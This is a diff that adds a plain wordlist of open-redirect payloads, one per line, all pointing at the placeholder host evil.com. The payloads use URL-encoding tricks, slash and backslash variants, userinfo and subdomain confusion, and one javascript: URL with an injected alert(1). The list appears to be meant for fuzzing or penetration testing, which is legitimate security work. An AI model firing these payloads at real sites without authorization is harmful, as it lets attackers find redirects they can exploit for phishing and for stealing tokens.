@@ -1,0 +1,21 @@
+# Open Redirect payloads — one per line
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+//evil.com/
+/\/evil.com
+/%2f/evil.com
+/%2f%2f/evil.com
+%2f%2fevil.com
+https:%2f%2fevil.com
+https://evil.com%2f%2f
+https:evil.com
+https://evil.com@example.com
+https://example.com.evil.com
+https://example.com%2eevil.com
+javascript://evil.com%0aalert(1)
+//evil.com%2f..
+/%09/evil.com
+/%5c/evil.com
+https://evil.com%2f%2f..
